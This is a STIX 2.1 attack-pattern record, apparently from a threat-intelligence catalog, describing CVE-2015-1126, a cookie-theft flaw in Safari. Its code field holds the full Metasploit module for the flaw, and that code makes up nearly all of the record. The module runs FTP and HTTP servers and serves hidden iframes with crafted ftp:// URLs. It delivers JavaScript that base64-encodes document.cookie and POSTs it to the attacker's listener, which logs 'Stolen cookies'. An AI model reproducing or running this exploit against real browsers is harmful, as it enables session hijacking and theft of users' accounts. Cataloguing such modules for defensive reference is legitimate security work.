{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e0277eb-da2e-481e-b07b-eed326be275b",
    "created": "2024-08-14T16:31:38.123413Z",
    "modified": "2024-08-14T16:31:38.123417Z",
    "name": "Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft",
    "description": " A vulnerability exists in versions of OSX, iOS, and Windows Safari released before April 8, 2015 that allows the non-HTTPOnly cookies of any domain to be stolen.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/apple_safari_ftp_url_cookie_theft.rb",
            "external_id": "apple_safari_ftp_url_cookie_theft.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1126"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Apr/30"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft',\n      'Description' => %q{\n        A vulnerability exists in versions of OSX, iOS, and Windows Safari released\n        before April 8, 2015 that allows the non-HTTPOnly cookies of any\n        domain to be stolen.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      => [\n        'Jouko Pynnonen', # Initial discovery and disclosure\n        'joev',           # msf module\n      ],\n      'References'  => [\n        [ 'CVE', '2015-1126' ],\n        [ 'URL', 'https://seclists.org/fulldisclosure/2015/Apr/30' ]\n      ],\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'DefaultAction'  => 'WebServer',\n      'DisclosureDate' => '2015-04-08'\n    ))\n\n    register_options([\n      OptString.new('URIPATH', [false, 'The URI to use for this exploit (default is random)']),\n      OptPort.new('SRVPORT',   [true, 'The local port to use for the FTP server', 5555 ]),\n      OptPort.new('HTTPPORT',  [true, 'The HTTP server port', 8080]),\n      OptString.new('TARGET_DOMAINS', [\n        true,\n        'The comma-separated list of domains to steal non-HTTPOnly cookies from.',\n        'apple.com,example.com'\n      ])\n    ])\n  end\n\n\n  #\n  # Start the FTP and HTTP server\n  #\n  def run\n    start_service\n    print_status(\"Local FTP: #{lookup_lhost}:#{datastore['SRVPORT']}\")\n    start_http\n    @http_service.wait\n  end\n\n\n  #\n  # Handle the HTTP request and return a response.  Code borrowed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http(opts={})\n    # Ensture all dependencies are present before initializing HTTP\n    use_zlib\n\n    comm = datastore['ListenerComm']\n    if comm.to_s == 'local'\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    # Default the server host / port\n    opts = {\n      'ServerHost' => datastore['SRVHOST'],\n      'ServerPort' => datastore['HTTPPORT'],\n      'Comm'       => comm\n    }.update(opts)\n\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      opts['ServerPort'].to_i,\n      opts['ServerHost'],\n      datastore['SSL'],\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self,\n      },\n      opts['Comm'],\n      datastore['SSLCert']\n    )\n\n    @http_service.server_name = datastore['HTTP::server_name']\n\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n\n    proto = (datastore['SSL'] ? 'https' : 'http')\n    print_status(\"Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}\")\n\n    if opts['ServerHost'] == '0.0.0.0'\n      print_status(\" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}\")\n    end\n\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n  end\n\n  #\n  # Lookup the right address for the client\n  #\n  def lookup_lhost(c=nil)\n    # Get the source address\n    if datastore['SRVHOST'] == '0.0.0.0'\n      Rex::Socket.source_address( c || '50.50.50.50')\n    else\n      datastore['SRVHOST']\n    end\n  end\n\n  #\n  # Handle the FTP RETR request. This is where we transfer our actual malicious payload\n  #\n  def on_client_command_retr(c, arg)\n    conn = establish_data_connection(c)\n    unless conn\n      c.put(\"425 can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status('Connection for file transfer accepted')\n    c.put(\"150 Connection accepted\\r\\n\")\n\n    # Send out payload\n    conn.put(exploit_html)\n    c.put(\"226 Transfer complete.\\r\\n\")\n    conn.close\n  end\n\n  #\n  # Kill HTTP/FTP (shut them down and clear resources)\n  #\n  def cleanup\n    super\n\n    # clear my resource, deregister ref, stop/close the HTTP socket\n    begin\n      @http_service.remove_resource(@uri_path)\n      @http_service.deref\n      @http_service.stop\n      @http_service.close\n      @http_service = nil\n    rescue\n    end\n  end\n\n\n  #\n  # Ensures that gzip can be used.  If not, an exception is generated.  The\n  # exception is only raised if the DisableGzip advanced option has not been\n  # set.\n  #\n  def use_zlib\n    unless Rex::Text.zlib_present? || !datastore['HTTP::compression']\n      fail_with(Failure::Unknown, \"zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!\")\n    end\n  end\n\n\n  #\n  # Returns the configured (or random, if not configured) URI path\n  #\n  def resource_uri\n    return @uri_path if @uri_path\n\n    @uri_path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))\n    @uri_path = '/' + @uri_path if @uri_path !~ /^\\//\n    @uri_path\n  end\n\n\n  #\n  # Handle HTTP requets and responses\n  #\n  def on_request_uri(cli, request)\n    if request.method.downcase == 'post'\n      json = JSON.parse(request.body)\n      domain = json['domain']\n      cookie = Rex::Text.decode_base64(json['p']).to_s\n      if cookie.length == 0\n        print_error(\"#{cli.peerhost}: No cookies found for #{domain}\")\n      else\n        file = store_loot(\n          \"cookie_#{domain}\", 'text/plain', cli.peerhost, cookie, 'cookie', 'Stolen cookies'\n        )\n        print_good(\"#{cli.peerhost}: Cookies stolen for #{domain} (#{cookie.bytes.length} bytes): \")\n        print_good(file)\n      end\n      send_response(cli, 200, 'OK', '')\n    else\n      domains = datastore['TARGET_DOMAINS'].split(',')\n      iframes = domains.map do |domain|\n        %Q|<iframe style='position:fixed;top:-99999px;left:-99999px;height:0;width:0;'\n                src='ftp://user%40#{lookup_lhost}%3A#{datastore['SRVPORT']}%2Findex.html%23@#{domain}/'>\n        </iframe>|\n      end\n\n      html = <<-HTML\n        <html>\n        <body>\n          #{iframes.join}\n        </body>\n        </html>\n      HTML\n\n      send_response(cli, 200, 'OK', html)\n    end\n  end\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message='OK', html='')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res['Content-Type'] = 'text/html'\n    res.body = html\n\n    cli.send_response(res)\n  end\n\n  def exploit_html\n    <<-HTML\n    <html><body>\n    <script>\n    var p = window.btoa(document.cookie);\n    var x = new XMLHttpRequest();\n    x.open('POST', \"http://#{lookup_lhost}:#{datastore['HTTPPORT']}#{resource_uri}\")\n    x.setRequestHeader('Content-type', 'text/plain');\n    x.send(JSON.stringify({p: p, domain: document.domain}));\n    </script>\n    </body></html>\n    HTML\n  end\n\n  def grab_key\n    @grab_key ||= Rex::Text.rand_text_alphanumeric(8)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-08"
}